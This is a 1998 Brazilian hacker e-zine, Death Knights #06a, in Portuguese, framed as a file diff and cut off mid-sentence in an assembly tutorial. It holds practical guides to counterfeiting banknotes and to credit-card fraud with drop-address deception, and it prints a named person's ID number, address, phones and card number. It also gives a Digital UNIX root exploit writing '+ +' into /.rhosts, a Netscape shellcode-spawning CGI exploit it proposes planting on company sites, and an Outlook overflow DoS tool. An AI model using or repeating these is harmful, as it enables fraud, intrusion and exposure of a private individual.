@@ -1,0 +1,1855 @@
+                  T     H     E
+
+         $Pø"ý$b   ,gPø"ýb  ,gPø"ýb  ,gPø$$$$$$$ý$b  $     $
+         $     $  $      $  $     $         $        $     $
+         $     $  $         $     $         $        $     $
+         $     $  $         $     $         $        $,   ,$
+         $     $  gPý""'    $$$$$$$         $        $$$$$$$
+         $     $  $         $     $         $        $'   `$
+         $     $  $      $  $     $         $        $     $
+         $     $  $      $  $     $        .$.       $     $
+         $,   g'  $,    g'  $     $        $$$       $     $
+         $Pýýø"    øýýýø"   ý     ý        $$$       ý     ý
+            $   $  
+            $  $   
+            $ $    
+            $$            ø
+            $$     $$  $  $  ,g$$$   $  $  $$$$$  .$$$$$
+            $ $    $ $ $  $  $       $  $    $    $$ 
+            $  $   $  $$  $  $  `"$  $$$$    $    `""'$.
+            $   $  $   $  $  `d$$b'  $  $    $        $$
+            $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P'
+
+ ______________________________Death_Knights_________________________________
+ ----------------------------------------------------------------------------
+
+                        Data estelar:  1.0874941883
+                        Data terrestre:  02/11/1998
+
+
+DeathKnights #06a
+
+e-mail: death@DeathKnights.com
+
+page: http://www.DeathKnights.com
+
+
+     melhor visualizado com joe -asis e terminal com setfont alt-8x16. (linux)
+                           melhor visualizado com edit.                (dos)
+
+
+ ______________________________Death_Knights_________________________________
+ ----------------------------------------------------------------------------
+
+
+
+.-----------.
+|   SECOES   \_______________________________________________________________
+`----------------------------------------------------------------------------'
+
+1  * ESCLARECIMENTOS                        Cacaio
+2  * Sobrevivendo nos dias atuais           sm0g (colaborador)
+3  * Programacao avancada de shell script   Cacaio
+4  * Digital UNIX 5.x exploit               Cacaio
+5  * Bugs novos do netscape                 Cacaio
+6  * Microsoft Outlook DoS                  Cacaio
+7  * Tutorial de asm!                       Hunter^Heads
+8  * ConSeal PC Firewall DoS                Cacaio
+9  * Perl 5.004 exploit                     Cacaio
+10 * EWorm Project                          sm0g (colaborador)
+11 * Exploits to get root                   ReNeGaDe
+--
+12 * Leiam...                               Cacaio
+13 * Few Words                              Cacaio
+
+-=[  1  ]=-
+.----------------.
+| ESCLARECiMENTOS \__________________________________________________________
+`----------------------------------------------------------------------------'
+
+
+        Nao nos responsabilizamos pela informacao contida neste zine. Se voce
+usar indevidamente qualquer informacao contida aqui, a responsabilidade e' to-
+da sua. Se for pego, preso ou sei la o que, nao nos perturbe.
+
+      Neste zine contamos com duas materias do nosso amigo sm0g, que nao
+e' um Death Knight, mas como nos mandou a materia e achamos interessante, a
+publicaremos.        Continuem mandando materias BOAS que serao publicadas!
+
+        Nos utlimos tempos, nao temos mais muito material nova para passar,
+isto significa que os desenvolvedores de programas/sistemas estao ficando mais
+espertos, e isto e' uma coisa boa. Talvez seja possivel chegar ao nivel de
+"bugs 0", mas enquanto isto, os que forem encontrados aparecerao na zine.
+Outro possivel motivo da falta de material talvez seja que nao tem muita coisa
+nova saindo. Mas, creio eu, que enquanto programas e sistemas novos forem
+desenvolvidos, bugs nao percebidos ate a divulgacao dos mesmos serao
+descobertos por usuarios comuns, como voce, como eu. Mas o nivel "bugs 0" pode
+ser alcancado quanto a bugs que possam causar danos ou dar acesso indevido. 
+
+        Este grupo nao visa nenhum fim lucrativo. Nos fazemos isto por diver-
+sao e nada mais. Se voce ainda assim achar que temos algum fin lucrativo,
+diga aonde voce viu isso, e lhe provarei o contrario.
+
+        Se voce nao gostou da informacao contida aqui, nao nos perturbe. O
+problema e' todo seu.
+
+
+
+
+
+-=[  2  ]=-
+.-----------------------------.
+| Sobrevivendo nos dias atuais \__________________________________________________________
+`----------------------------------------------------------------------------'
+                               by sm0g
+
+        Isso talvez possa ser considerado uma incitacao a falsificacao. Pelos
+ meus calculos, o numero de famintos eh inversamente proporcional ao patrimo-
+ nido dos administradores da Visa, Mastercard (quartel), e similares. Essa eh
+ a minha revolta pessoal a esses merdas. Ja diziam que os amadores imitam, os
+ profissionais copiam.. bem, os techno punks falsificam  =)
+
+      .--------------------------.  
+      | 1.1  Nos e o plano real   `------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+
+	Vou procurar nao estender as minhas criticas pois isso decerto nao eh
+ um texto politico. Com a aprovacao do Plano Real, a unica realidade que tenho
+ visto eh o desemprego... A voces que alem de trabalho, nao tem grana, eh que
+ eu dedico essa parte.
+ Vamos evitar entrar nos complexos detalhes da fabricacao do papel moeda, pois
+ eu odeio quimica:
+
+	Antigamente, alem da estampa, os falsificadores tentavam tambem copiar
+ o papel moeda, sob o qual eh estampada a nota. Alem de aumentar o custo desse
+ dinheiro falso, havia o problema da quimica, pois o papel moeda eh complexo e
+ dificil de ser reproduzido (as notas falsas podiam ser reconhecidas pela mah
+ coloracao, ou mesmo pelo tato). Percebeu-se entao que as notas de baixo valor
+ apresentavam uma otima opcao a fabricacao do papel. A ideia eh simplesmete
+ remover as estampas de uma nota de baixo valor (R$1), e aplicar a esse papel
+ uma nova estampa, de alto valor (R$100, por exemplo).
+	Aqui no  TAff Labs, nos bolamos uma mistura formada por  diversos sol-
+ ventes, que apresentou um resultado satisfatorio. Essa mistura ainda nao esta
+ publicamente disponivel.. em breve, quem sabe... O seu unico trabalho portan-
+ to, sera criar a sua propria "mistura magica".
+	Apos criar sua mistura, coloque-a num recipiente de vidro (dependendo
+ do que voce fez, o composto pode atacar o plastico), e adicione uma nota de 1
+ real. Apos algumas horas, voce devera obter uma nota branquinha.. Geralmente,
+ eh necessario se esfregar a nota para a tinta sair.
+	Vou supor nesse texto que voce possui um scanner e uma impressora boa.
+ Ao contrario do que muitos pensam, nao eh imprescindivel o uso de impressora
+ laser, que muitas vezes chegam a dar um aspecto artificial a nota.
+ Uma resolucao de 800 pixels  eh suficiente, embora 1200 nao seja mah. Scanei
+ os 2 lados de uma nota de R$50, por  exemplo. Note que muitos editores grafi-
+ cos alteram o tamanho da figura apos ela ser scaneada! Configure corretamente
+ sua impressora, para que ela possa imprimir exatamente no papel moeda (aprox.
+ 14 x 6,3). Essa setagem talvez seja a parte mais dificil, pois eh comum nao
+ se achar a posicao certa, e estragar um trabalho de algumas horas. Deixa a
+ nota descansando por alguns minutos, para que a tinta possa ser melhor absor-
+ vida e fixada no papel.
+        Nas notas mais antigas, a tarja de identificacao (aquela fitinha escu-
+ ra,  que todo mundo confere na nota) era simplesmente colada na nota. Hoje em
+ dia, essas fitinhas sao transsadas no tecido, o que dificulta a sua remocao.
+ No entanto, o  uso de um bom scaner torna essa fita desnecessaria, pois como
+ ela eh agregada a nota, nao fara (ao menos numa breve olhada) diferenca algu-
+ ma se ela estiver colada, ou simplesmente imprimida..
+
+
+
+      .-----------------------.
+      |   1.2 Usos e cuidado   `---------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+
+	Recomendo que a imagem das notas scaneadas sejam salvas apenas em um
+ disquete criptografado, e muito bem guardado. A policia tem o direito de ar-
+ rombar sua casa, caso aja suspeita de falsificacao. Cuide tambem de esconder
+ os produtos usados para fazer o seu solvente, e principalmente as notas pro-
+ duzidas.
+	O melhor metodo que tenho utilizado notas falsas, eh simplesmente ir a
+ um McDonald's lotado, e comprar por exemplo uma batata frita.. A nota vai em-
+ bora, e em troca temos um troco limpinho (mac-lavagem duh). Quando for fazer
+ compras, procure usar as falsas "no bolo", ou seja, nunca compre algo com
+ somente 1 nota falsa... Evite tambem fabricar notas de valor muito alto, como
+ R$100, pois elas chamam mais atencao na hora de serem aceitas.
+
+                                     . . .
+
+
+      .--------------------------.  
+      |  2.1 Carding para todos   `------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+ .Introducao.
+
+        Carding como se sabe, sao as  tecnicas utilizadas para se comprar mer-
+ cadorias, atraves de numeros de cartoes de credito falso. Pode-se dizer que a
+ grande parte maioria da literatura sobre o assunto eh incompleta. Alem de an-
+ tigos, tais textos usam situacoes irreais como exemplo.. Sem mencionar o fato
+ de que a grande maioria desses documentos provem dos EUA, cujo burocracia eh
+ bem diferente da nossa.
+	Existem diversos programas (e algoritmos) utilizados para se criar mi-
+ lhares de numeros de cartoes em segundos. Esse tipo de programa, serve quase
+ que unicamente para sites de sexo, ou download pago, onde a verificacao do cc
+ eh apenas superficial. Por superficial, entenda que o sistema apenas verifica
+ se o numero que voce entrou tem a mascara do fabricante associado, e nao eh
+ apenas um lixo como 1234.11.1111. Nesse tipo de fraude (estritamente on-line)
+ tudo o que voce tem a fazer eh gerar um numero de cc falso, acessar algo como
+ por  exemplo o Anonymiser (que impede que o  seu IP seja rastreado), e de lah
+ saltar para o site alvo. Voce simplesmente fornece um nome, uma data de expi-
+ racao, e o numero cc gerado. Isso eh simples e nao requer QI nenhum.. O obje-
+ tivo desse texto no entanto, eh tratar de compras reais, e nao simplesmente
+ material on-line... vamos comecar:
+
+	A teoria eh simples, qualquer cc possui, alem do numero, 2 informacoes
+ vitais para nossa operacao: a data de expiracacao, ou seja, o dia a partir do
+ qual o cartao deixa de "valer"; e o dia da fatura, ou "dia bom". O dia da fa-
+ tura eh o  dia no qual a Administradora do cartao ira enviar-lhe uma cobranca
+ correspondente as compras do  mes anterior. Suponhamos que o dia da fatura de
+ seu cartao seja o dia 29. Para que a cobranca chegue ao dono do cartao exata-
+ mente nesse dia, eh obvio que o cartao precisa "fechar a conta" do mes alguns
+ dias antes, para que tenha dela chegar (via correio, geralmente) ao cliente.
+ Esse fechamento de conta, ocorre normalmente de 2 a 3 dias antes do dia de
+ fatura do cliente. Logo, se voce fizer uma compra no dia 28 e possivelmente
+ 27, a cobranca soh ira chegar no proximo mes, pois a fatura do mes atual jah
+ foi espedida, isso nos da quase 33 dias! Sim, voce sabe disso... Mas eh exa-
+ tamente aqui que esta o  pulo do gato. Se voce usar um cartao de alguem para
+ uma compra, isso significa que voce tera aprox. 33 dias de vantagem para pe-
+ gar a mercadoria e sumir. Considerando que programas como por exemplo o Shop
+ Time demoram de 7 a 10 dias para entregar algo, o dono do cartao soh ira no-
+ tar a facada 20 dias depois de voce ja ter pego a encomenda  =)
+        Qualquer compra via cartao de credito envolve antes de mais nada, um
+ numero de cartao, e geralmente informacoes adicionais, tais como nome do do-
+ no do cartao, CIC, RG, CPF, telefone, endereco, data  de nascimento, data de
+ espiracao do cartao, etc. Nesse texto eu irei supor que alem de inteligencia
+ o leitor tambem tem a capacidade de conseguir alem de um numero de cc, tais
+ informacoes (seja invadindo um isp, eng. social, etc). Como detonar a Mandic
+ esta na moda, eu ajudo voce...
+
+ Gustavo Henrique Palhares de Miranda
+ Nascimento: 17/08/58  CPF: 60749105704
+ Rua Senador Salgado Filho nº 208, Petropolis - RJ  CEP: 25655350
+ Pais: Brasil
+ CC: 376441125801003  Validade: 1098
+ Fone comercial:   (011)886-2562
+ Fone residencial: (024)242-9261
+ FAX:              (011)885-8479
+
+ Sim, a validade ja passou. Voce nao tera problemas de conseguir o proximo
+ numero, tera?! :)
+
+	Tudo otimo. Mas como e onde entregar o pacote?! A empresa pode ligar
+ para o dono do cartao para ter certeza da compra!! He he... o TAff Labs foi
+ ainda mais longe.. as empresas de venda verificam basicamente o nome do do-
+ no do cartao, RG, CIC, CPF, endereco, e se o cara tera condicoes bancarias
+ de pagar. Eles rarissimamente iram ligar na sua casa para confirmar algo...
+ Mas somos profissionais, e queremos fornecer um numero de telefone que ao
+ menos nos de alguma seguranca. Eh ai que entram os "numeros mortos". Os nu-
+ meros mortos sao linhas telefonicas desativadas (nao confunda com cortadas)
+ pela Telesp. Quando voce liga pra um  desses numeros, ele ira tocar, tocar,
+ e ninguem nunca ira atender. Tudo o que voce tem a fazer, eh arrumar um nu-
+ mero desses, e usa-lo.
+	A entrega do pacote eh um pouco mais complexa. Um metodo que eu uso
+ com sucesso, eh forjar  um cartao de apresentacao  falso, com o nome de uma
+ empresa / igreja, um nome falso, e um numero morto. Eu visto uma roupa boa,
+ e vou ate alguma casa fora da minha cidade (essa casa jah foi previamente
+ selecionada, pois  foi esse endereco que eu forneci a loja), e me apresento
+ ao morador, dizendo que sou da Empresa X tal, e que por um erro do correio,
+ uma certa mercadoria chegara em sua  casa dele. Dai peco a ele que me ligue
+ quando o pacote chegar. Como recompensa por sua colaboracao , o nobre cida-
+ dao ira ganhar algo como R$30. O numero dado ao morador eh morto, e nunca
+ vai atender, assim, eu pego o numero dele, e lhe ligo a cada 3 dias, pra
+ confirmar a entrega do pacote.
+
+
+     sm0g                  sm0g@psynet.net
+     `'`'                  `'`'`'`'`'`'`'`
+
+
+-=[  2  ]=-
+.-------------------------------------.
+| Programacao avancada de shell script \_____________________________________
+`----------------------------------------------------------------------------'
+                                by Cacaio
+
+        Bem... no zine deathknights05 eu mostrei o basico de shell  scripts,
+agora irei aprofundar um pouco mais, nao por que alguem pediu, mas por que
+eu simplesmente  amo  shell scripts e creio que algum leitor por ai' possa
+tirar bom proveito.
+
+       No ultimo numero, eu editei os arquivos com o cat mesmo (cat >arquivo),
+mas para voce trabalhar melhor, recomendo um editor de texto. Alguns bons?
+Pico, para iniciantes, joe e emacs, para usuarios intermediarios, e o vi para
+usuarios avancados.
+
+
+        Vamos comecar criando o basico do basico do basico. Voce depois junta
+as funcoes e ve em que bixo que da, voce vai gostar! :)
+
+arquivo eg1.sh
+---
+### #  #      #
+#Basico do basico do basico do basico.
+### #  #      #
+# Os sinais '#', servem para comentar as linhas. Voce pode colocar o texto que
+# quiser que nao fara diferenca para o script. 
+### #  #      #
+# Vamos ver o comando 'echo'. E' como o echo da shell. Apenas aparece a
+# mensagem.
+### #  #      #
+
+echo "Farwell and goodnight"            # Vai aparecer a mensagem
+                                        # 'Farwell and goodnight' na tela.
+
+### #  #      #
+# Como o echo usado e' o echo binario, voce pode usar todas as funcoes dele,
+# como echo "blehg" >arquivo.
+---
+
+Legal... voce entendeu por que todos conseguem entender, e e' muito bobo. Mas
+e se voce quiser perguntar, por exemplo, Qual o e-mail e quer que o e-mail
+apareca dentro de um arquivo de texto? Simples, observe:
+
+arquivo eg2.sh
+---
+echo "Qual o seu e-mail fiote?"
+read emaildocara
+echo "O e-mail do usuario" `whoami` "e':" $emaildocara >>arquivito
+---
+
+Entendeu? emaildocara e' o nome da variavel em que vai ficar guardada a
+informacao do read. Se voce nao entendeu o `whoami`, leia a zine numero 05.
+Depois de executar, edite o arquivo arquivito. Ele devera estar mais ou menos assim:
+
+--
+O e-mail do usuario cacaio e': cacaio@deathknights.com
+--
+
+Sacou? 
+
+E se voce quiser fazer alguma coisa com varias escolhas, como:
+(A)bort, (R)etry or (F)ail?
+Simples... de uma ohladinha neste exemplo:
+
+eg3.sh
+---
+echo "Faca sua escolha:"
+echo ""
+echo "(L)istar Diretorio, (D)iretorio Atual, ou (W)hoami?"
+read escolha
+case $escolha in
+
+L) echo "Voce escolheu Listar Diretorio";
+   ls ;;
+
+D) echo "Voce escolheu Diretorio Atual";
+   pwd ;;
+
+W) echo "Voce escolheu Whoami"
+   whoami ;;
+
+*) echo "Erro." $escolha "nao e um comando valido para este programa.";;
+
+esac
+---
+
+Moleza, ne'?
+
+Agora vamos fazer outra coisa... usar o comando if. De uma olhada detalhada
+neste exemplo:
+eg4.sh
+---
+function mensagem {
+	clear
+	echo "Erro: Voce digitou apenas $0 sem mais nenhum parametro."
+}
+
+function uso {
+	echo "O uso correto e':"
+	echo "[1;37m$0 -mensagem texto"
+}
+
+if [ $1x = x ]; then
+        mensagem
+        uso
+        exit 1
+fi
+
+if [ "$1" = '-mensagem' ]; then
+	echo "Mensagem: $2 $3 $4"
+        exit 0
+fi
+---
+Entendeu o que ele faz? O if e' a traducao mesmo. Se "$1" for igual a
+"talcoisa", entao fazseilaoque, e finaliza o if com o "fi". O function e'
+apenas uma funcao que voce cria. Voce pode criar shell scripts para o que
+quiser. Tambem pode ser usado ANSI, como mostrado no ultimo exemplo.
+
+Eh isso ae... agora, use a imaginacao e se divirta.
+
+
+	[]'z
+
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  4  ]=-
+.-------------------------.
+| Digital UNIX 5.x exploit \_________________________________________________
+`----------------------------------------------------------------------------'
+                                by Cacaio
+
+        Opa! Eu tava um dia eu estava com conta em uma maquina na Coreia que
+rodava Digital UNIX 5.60, e eu tentava rootear usando a conta, procurei
+exploits, nao consegui, tudo envao. Entao, eu mesmo resolvi estudar alguns
+programas desta versao e encontrei algo interessante. Entao, creio eu, que
+este seja o primeiro exploit para Digital UNIX 5.x. Como eu cheguei ate' ele?
+Ja falei, estudando os programas e vendo o que eles faziam quando eram
+executados. E em um deles, que eu pensava que nao teria utilidade, eu nao dava
+nada por ele, enfim, encontrei algo bom. Este programa e' o fstab. Ele nao faz
+nada demais... so mostra informacao sobre o sistema de arquivos e as particoes
+swap, mas quando o root executa, ele cria um arquivo no /tmp com umas
+permissoes, digamos, bem generosas.
+
+  /tmp>ls -la
+
+  ( Vai mostrar alguns arquivos do /tmp, e entao: )
+
+  -rw-rw-rw-   1 root     system    0 Oct 25 17:52 fstab.advfsd.lockfile
+
+Mas, como sempre tem alguem que nao tem ideia do que fazer com ele, eu direi
+exatamente o que fazer e como acessar a maquina como root. Para acessar, voce
+necessitara apenas de um link estatico do /tmp/fstab.advfsd.lockfile para o
+/.rhosts. Nao sabe fazer isto? Entao digite:
+
+  ln -s /.rhosts /tmp/fstab.advfsd.lockfile
+
+E aqui o passo magico... digite:
+
+  cat "+ +" > /tmp/fstab.advfsd.lockfile
+
+E assim, automaticamente a linha + + estara no /.rhosts possibilitando o
+acesso sem senha via rlogin. Simples, mas demorei um pouquinho ate descobrir
+isso. Espero que seja util para alguem.
+
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+
+-=[  5  ]=-
+.-----------------------.
+| Bugs novos do netscape \___________________________________________________
+`----------------------------------------------------------------------------'
+                                by Cacaio
+
+       Bugs e mais bugs... o primeiro funciona perfeitamente com as versoes do
+4.05 e 4.5b1 do netscape.
+
+O que acontece? Nada demais... ele somente trava quando recebe um
+content-type contendo "internal/parser" (Analisador Interno).
+
+Isto pode ser feito em uma pagina qualquer ou com um script cgi que contenha
+as seguintes linhas:
+
+---
+#!/bin/sh
+echo Content-type: internal/parser
+echo
+echo Se voce pode ler isto seu browser nao e' vulneravel!
+---
+
+Talvez seja possivel fazer algo pior do que travar o browser. Se os dados
+vao para o mesmo lugar que as analises das paginas vao, eu imagino que seja
+possivel fazer um belo buffer overflow, mas isto nao foi testado ainda.
+
+
+Agora falarei de um outro bug que somente afeta netscapes em linux em
+computadores x86. Basta acessar algum script cgi que contenha o seguinte:
+
+---
+#!/usr/bin/perl
+#
+# Script escrito por Dan Brumleve e modificado por Cacaio.
+
+sub parse {
+  join("", map { /^[0-9A-Fa-f]{2}$/ ? pack("c", hex($_)) : "" } @_);
+}
+
+my $pre = parse qw{
+  31 c0 		# xorl %eax,%eax
+  66 b8 ff 0f		# movw $0x1056,%ax
+  01 c4			# addl %eax,%esp 
+  c0 24 24 01		# shlb $1,(%esp)
+  29 c4			# subl %eax,%esp
+
+  31 c0 b0 30
+  31 db b3 0e
+  31 c9 b1 01
+  cd 40
+};
+
+my $code = $pre . parse qw{
+  b0 55			# movb $0x55,%al (marker)
+  eb 58                 
+
+  5e			# popl %esi
+
+  56			# pushl %esi
+  5b			# popl %ebx
+  43 43 43 43 43 43
+  43 43 43 43 43	# addl $0xb,%ebx
+
+  21 33			# andl %esi,(%ebx)
+  09 33			# orl %esi,(%ebx)
+
+  31 c0 		# xorl %eax,%eax
+  66 b8 56 10		# movw $0x1056,%ax
+  01 c4			# addl %eax,%esp 
+  c0 24 24 01		# shlb $1,(%esp)
+  33 c0			# xorl %eax,%eax
+  b0 05 		# movb $5,%al
+  01 c4			# addl %eax,%esp 
+  c0 24 24 01		# shlb $1,(%esp)
+  29 c4			# subl %eax,%esp
+  66 b8 56 10		# movw $0x1056,%ax
+  29 c4			# subl %eax,%esp
+
+
+  31 d2			# xorl %edx,%edx
+  21 56 07		# andl %edx,0x7(%esi)
+  21 56 0f		# andl %edx,0xf(%esi)
+  b8 1b 56 34 12	# movl $0x1234561b,%eax
+  35 10 56 34 12	# xorl $0x12345610,%eax 
+
+  21 d9			# andl %ebx,%ecx
+  09 d9			# orl %ebx,%ecx
+
+  4b 4b 4b 4b 4b 4b
+  4b 4b 4b 4b 4b	# subl $0xb,%ebx
+
+  cd 40			# int $0x80
+  31 c0			# xorl %eax,%eax
+  40			# incl %eax
+  cd 40			# int $0x80
+
+
+  e8 a3 ff ff ff        
+};
+
+$code .= "/bin/sh";
+
+my $transmission = parse qw{
+  74 68 65 20 64 65 61 74 68 20 6b 6e 69 67 68 74 73 # inguz
+  20 72 6f 78 20 73 75 70 72 65 6d 65 20 20 20 63 61 # inguz
+  63 61 69 6f 20 74 6f 6f 20 20 67 6f 74 20 69 74 de # inguz
+};
+
+my $nop = "\x90"; 
+
+my $address = "\x10\xdb\xff\xbf"; 
+             
+
+my $len = 0x1000 - length($pre);
+my $exploit = ($nop x 1138) . ($address x 3) . ($nop x $len) . $code;
+
+print <<EOF;
+Content-type: text/html
+
+<!-- $transmission -->
+<embed type="$exploit" src="data:x">
+EOF
+---
+
+Coloque como um script cgi e acesse para ver. Bom, nao e'? Imagina se alguem
+altera uma pagina de uma grande compania e coloca um refresh 0 na pagina
+principal apontando para este cgi. Legal a ideia, nao? :)
+
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+
+-=[  6  ]=-
+.------------------------------------.
+| Microsoft Outlook Denial Of Service \______________________________________
+`----------------------------------------------------------------------------'
+                                by Cacaio
+
+Bom, para quem nao sabe, o Microsoft Outlook e' um leitor de mail para Windows
+95/98/NT. Eu gostaria muito de saber onde a empresa que tem mais dinheiro no
+mundo contrata seus programadores. E eu tambem gostaria de saber por que a
+grande maioria dos usuarios da seu dinheiro para eles. Sao perguntas que nao
+tem como serem respondidas... vamos seguir adiante...
+
+Como eh o bug? Quando o Microsoft Outlook le o subject de um email ele coloca
+o subject em uma area da memoria, mas so com 5000 caracteres para ela, e nao
+checa o tamanho do subject.
+
+O programinha a seguir trava o windows da pessoa. Tambem e' possivel executar
+comandos remotos, mas particularmente nao sei como, mas que e' possivel e'.
+
+Ta ai o arquivo pro uso do pessoal...
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+/*
+   Programa feito por rockme@altern.org
+   e modificado por cacaio@deathknights.com
+*/
+
+
+#include <stdio.h>
+#include <strings.h>
+#include <errno.h>
+#include <signal.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+struct in_addr
+resolv(char *name)
+{
+  static struct in_addr in;
+  unsigned long l;
+  struct hostent *ent;
+
+  if((l = inet_addr (name)) != INADDR_NONE)
+    {
+      in.s_addr = l;
+      return in;
+    }
+  if(!(ent = gethostbyname (name)))
+    {
+      in.s_addr = INADDR_NONE;
+      return in;
+    }
+  return *(struct in_addr *) ent->h_addr;
+}
+
+
+   char buf[70000];
+   char server[5000];
+   char mailfrom[5000];
+   char rcptto[5000];
+
+
+main (int argc, char *argv[])
+{
+  struct sockaddr_in addr;
+  int i, s;
+  char c;
+  int port=25;
+  
+ 
+ if(argc < 3){
+ printf("\n Uso : %s servidor_de_mail remetente destinatario \n\n", argv[0]);
+ printf(" ATENCAO: Este programa nao spoofa seu IP!\n\n");
+ exit(0);
+ } 
+
+ if(strlen(argv[1]) > 4990){
+ printf("O servidor de email e' muito grande.\n");
+ exit(0);
+ }
+
+ if(strlen(argv[2]) > 4990){
+ printf("O endereco do repetente e' muito grande.\n");
+ exit(0);
+ }
+
+ if(strlen(argv[3]) > 4990){
+ printf("O endereco do destinatario e' muito grande.\n");
+ exit(0);
+ }
+ 
+ /*  Viram soh? Este programa e' protegido de buffer overflows! :P */
+ 
+ printf("\nThe Death Knights - www.deathknights.com\n\n\n");
+ printf("Microsoft Outlook Denial of Service !\n");
+ printf("Veuillez patienter environ 20 secondes suivant la vitesse du serveur ...\n");
+
+ sprintf(server, "HELO %s\n", argv[1]); 
+ sprintf(mailfrom, "MAIL FROM: %s\n", argv[2]);
+ sprintf(rcptto, "RCPT TO: %s\n", argv[3]);
+
+  s = socket(AF_INET, SOCK_STREAM, 0);
+  addr.sin_family = AF_INET;
+  addr.sin_addr = resolv(argv[1]);
+  addr.sin_port = htons(port);
+  connect(s, (struct sockaddr *) &addr, sizeof (addr)); 
+
+write(s, server, strlen(server));
+sleep(1);
+
+write(s, mailfrom, strlen(mailfrom));
+sleep(1);
+
+write(s, rcptto, strlen(rcptto)); 
+sleep(1);
+
+write(s, "data\n", 5);
+sleep(1);
+
+write(s, "Subject : ", 10);
+sleep(1);
+
+for(i = 1; i < 7000; i++){
+write(s, "X", 1);
+}
+sleep(3);
+
+write(s, "\n", 1);
+sleep(1);
+
+write(s, "gift of a death knight\n", 8); 
+sleep(1);
+
+write(s, ".\n", 2);
+sleep(1);
+
+write(s, "quit\n", 5);
+sleep(1);
+
+read(s, buf, 69000); /* read (s, &c, 1); */
+printf("%s", buf);  
+
+printf("\n");
+
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  7  ]=-
+.-----------------.
+| Tutorial de asm! \_________________________________________________________
+`----------------------------------------------------------------------------'
+                             by Hunter^Heads
+
+bom vamos realmente ao o que interessa agora a programacao propriamente dita
+
+
+- requerimentos minimos ..
+Para que possamos criar um programa, precisamos de algumas ferramentas:
+Primeiro de um editor para criar o programa fonte. Segundo de um montador,
+um programa que ir  transformar nosso fonte num programa objeto. E,
+terceiro, de um linker (ligador) que ir  gerar o programa executavel a
+partir do programa objeto.
+O editor pode ser qualquer um que dispusermos. O montador ser  o TASM macro
+assembler da Borland, e o linker ser  o TLINK, tambBm da Borland.
+Nos devemos criar os programas fonte com a extensao .ASM para que o TASM
+reconheca e o transforme no programa objeto, um "formato intermedi rio" do
+programa, assim chamado porque ainda nao e um programa executavel e tao
+pouco um programa fonte. O linker gera a partir de um programa .OBJ, ou da
+combinacao de varios deles, um programa executavel, cuja extensao 
+normalmente .EXE, embora possa ser .COM dependendo da forma como for
+montado e ligado.
+Para construirmos os programas com o TASM, devemos estruturar o fonte de
+forma diferenciada ao que fazcamos com o programa debug.
+
+E importante incluir as seguintes diretivas assembly:
+.MODEL SMALL -> Define o melo de memoria a usar em nosso programa
+.CODE -> Define as instrucoes do programa, relacionado ao segmento de codigo
+.STACK -> Reserva espaco de memoria para as instrucoes de programa na pilha
+END -> Finaliza o prg
+.x.x.x.x.x.
+primeiro .. vamos fazer um code base soh pra instruir melhor
+.MODEL SMALL -> modelo de memoria
+.CODE -> espaco de memoria para instrucoes do programa na pilha
+.STACK -> as linhas seguintes sao instrucoes do programa
+mov ah,2h -> move o valor 2h para o registrador ah
+mov dl,2ah -> move o valor 2ah para o registrador dl
+int 21h -> interrupcao 21h
+mov ah,4ch -> imprime na tela 
+int 21h -> interrupcao 21h
+end -> final do programa
+
+x-x-x-x-x-
+
+agora soh compilar com tasm / tlink ..
+se nao souber fazer isto tbem neh sai de perto..
+..
+bom vamos para segmentos ..
+..
+A arquitetura dos processadores x86 forca-nos a usar segmentos de memoria
+para gerenciar a informacao, o tamanho destes segmentos B de 64Kb.
+
+A razao de ser destes segmentos e que, considerando que o tamanho maximo de
+um numero que o processador pode gerenciar e dado por uma palavra de 16
+bits ou registrador, assim nao seria possivel acessar mais do que 65536 locais
+da memoria usando apenas um destes registradores. Mas agora, se a memoria do
+PC e dividida em grupos de segmentos, cada um com 65536 locais, e podemos usar
+um endereco ou registrador exclusivo para encontrar cada segmento, e ainda
+fazemos cada endereco de um especifico slot com dois registradores
+possivel acessar a quantidade de 4294967296 bytes de memoria,
+atualmente, a maior memoria que podemos instalar num PC.
+
+Desta forma, para que o montador seja capaz de gerenciar os dados, se faz
+necessario que cada informacao ou instrucao se encontre na  real
+correspondente ao seu segmento. O endereco do segmento e fornecido ao
+montador pelos registradores DS, ES, SS e CS. Lembrando um programa no
+Debug, observe:
+
+1CB0:0102 MOV AX,BX
+
+O primeiro numero 1CB0, corresponde ao segmento de memoria que esta  sendo
+usado, o segundo e uma referencia ao endereco dentro do segmento, e um
+deslocamento dentro do segmento offset.
+
+O modo usado para indicar ao montador com quais segmentos vamos trabalhar e
+fazendo uso das diretivas .CODE, .DATA e .STACK.
+
+O montador ajusta o tamanho dos segmentos tomando como base o numero de
+bytes que cada instrucao assembly precisa, ja  que seria um desperdicio de
+memoria usar segmentos inteiros. Por exemplo, se um programa precisa de
+apenas 10Kb para armazenar dados, o segmento de dados seria apenas de 10Kb
+e nao de 64Kb, como poderia acontecer se feito manualmente.
+
+.... tabelas de equivalencia
+..
+Cada uma das partes numa linha de codigo assembly e conhecida como token,
+por exemplo:
+
+MOV AX,Var
+
+Aqui temos tres tokens, a instrucao MOV, o operador AX e o operador VAR. O
+que o montador faz para gerar o codigo OBJ e ler cada um dos tokens e
+procurar a equivalencia em codigo de maquina em tabelas correspondentes,
+seja de palavras reservadas, tabela de codigos de operacao, tabela de
+simbolos, tabela de literais, onde o significado dos enderecos dos simbolos
+que usamos serao encontrados.
+A maioria dos montadores sao de duas passagens. Em sintese na primeira
+passagem temos a definicao dos simbolos, ou seja, sao associados enderecos
+a todas as instrucoes do programa. Seguindo este processo, o assembler lH MOV
